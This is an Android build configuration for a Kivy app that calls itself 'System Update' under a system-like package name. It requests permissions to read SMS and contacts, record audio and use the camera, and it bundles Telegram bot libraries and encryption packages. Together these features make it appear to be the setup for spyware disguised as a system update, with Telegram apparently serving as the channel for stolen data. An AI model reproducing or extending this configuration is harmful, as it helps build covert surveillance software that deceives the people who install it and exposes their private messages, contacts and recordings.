[app]
title = System Update
package.name = sysupdate
package.domain = org.system.update
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,xml,bin,sh
version = 0.1
requirements = python3,kivy==2.3.0,requests,flask,pyjnius,pycryptodomex,openssl,python-telegram-bot==13.15
orientation = portrait
osx.python_version = 3
osx.kivy_version = 2.3.0
fullscreen = 0

[buildozer]
log_level = 2
warn_on_root = 1

[android]
api = 33
minapi = 21
ndk = 25b
android.permissions = INTERNET, ACCESS_NETWORK_STATE, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO, CAMERA, READ_CONTACTS, RECEIVE_SMS, READ_SMS
android.add_src = yes
android.gradle_dependencies = 'org.telegram:telegrambots:6.9.7.1'
